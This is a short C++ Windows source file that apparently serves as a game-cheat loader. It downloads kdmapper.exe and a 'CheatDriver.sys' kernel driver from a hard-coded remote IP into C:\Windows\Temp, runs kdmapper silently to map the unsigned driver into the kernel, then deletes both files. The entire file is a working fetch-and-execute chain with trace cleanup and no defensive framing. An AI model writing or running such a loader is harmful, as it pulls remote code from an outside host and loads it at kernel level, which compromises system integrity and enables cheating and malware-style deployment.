#include <iostream>
#include <fstream>
#include <Windows.h>
#include <cstdlib>
#include <urlmon.h>


#pragma comment(lib, "urlmon.lib")


void executeKdmapper(const std::string& kdmapperPath, const std::string& driverPath) {
    std::string command = kdmapperPath + " " + driverPath + " > NUL 2>&1";
    std::system(command.c_str());
}

int loader() {
    std::string kdmapper_url = "http://91.191.173.36/kdmapper.exe"; // replace with your URL
    std::string driver_url = "http://91.191.173.36/CheatDriver.sys"; // replace with your URL
    std::string kdmapper_path = "C:\\Windows\\Temp\\kdmapper.exe";
    std::string driver_path = "C:\\Windows\\Temp\\CheatDriver.sys";

    // Download kdmapper
    try
    {
        URLDownloadToFile(NULL, kdmapper_url.c_str(), kdmapper_path.c_str(), 0, NULL);
	}
    catch (std::exception& e) {
		std::cout << "Failed to download kdmapper file: Check URL. " << e.what() << std::endl;
		return 1;
	}
    
    try {
        URLDownloadToFile(NULL, driver_url.c_str(), driver_path.c_str(), 0, NULL);
    }
    catch (std::exception& e) {
        std::cout << "Failed to download driver file: Check URL. " << e.what() << std::endl;
        return 1;
    }
    
    

    // Load driver
    executeKdmapper(kdmapper_path, driver_path);
	
    

    // Clean up
    remove(kdmapper_path.c_str());
    remove(driver_path.c_str());

    return 0;
}
